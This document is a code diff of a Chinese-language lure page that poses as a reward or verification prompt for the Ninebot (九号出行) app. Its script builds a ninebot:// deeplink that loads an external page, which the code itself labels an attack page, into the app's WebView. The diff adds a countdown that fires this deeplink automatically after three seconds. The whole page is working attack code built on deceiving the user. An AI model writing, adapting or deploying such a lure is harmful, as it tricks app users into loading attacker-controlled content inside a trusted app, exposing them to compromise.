@@ -60,22 +60,32 @@
 
   <button class="cta" id="go">立即打开 App 领取</button>
   <div class="sub">点击后将自动跳转 <b>九号出行 App</b> 完成核验<br>未安装？<a href="javascript:void(0)" id="retry">重试跳转</a> 或前往应用商店搜索「九号出行」</div>
+  <div id="countdown" style="text-align:center;margin-top:16px;font-size:15px;color:#ffb340;font-weight:700"></div>
   <div id="jumplog"></div>
 
 <script>
   // deeplink: 打开App内WebView并加载攻击页 (九号scheme)
   var ATTACK = "https://derham1999.github.io/ai-daily/nb-attack.html";
-  var DL = "ninebot://ninebot.ninebot.com/openPage?destination=webview&parameters=" +
+  var DL = "ninebot://ninebot.ninebot.com/openPage?destination=webpage&parameters=" +
            encodeURIComponent(JSON.stringify({url: ATTACK}));
   var log = document.getElementById("jumplog");
+  var cd = document.getElementById("countdown");
   function jump(tag){
+    cd.innerHTML = "🚀 正在跳转九号App…";
+    cd.style.fontSize = "18px";
     log.textContent = "[deeplink " + tag + "] " + DL.substring(0, 60) + "…";
     location.href = DL;
   }
   document.getElementById("go").addEventListener("click", function(){ jump("btn"); });
   document.getElementById("retry").addEventListener("click", function(){ jump("retry"); });
-  // 自动跳转(页面加载后尝试唤起App)
-  setTimeout(function(){ jump("auto"); }, 1600);
+  // 倒计时3秒后自动跳转
+  var n = 3;
+  cd.textContent = "⏳ " + n + " 秒后自动打开 App…";
+  var timer = setInterval(function(){
+    n--;
+    if(n > 0){ cd.textContent = "⏳ " + n + " 秒后自动打开 App…"; }
+    else { clearInterval(timer); jump("auto"); }
+  }, 1000);
 </script>
 </body>
 </html>
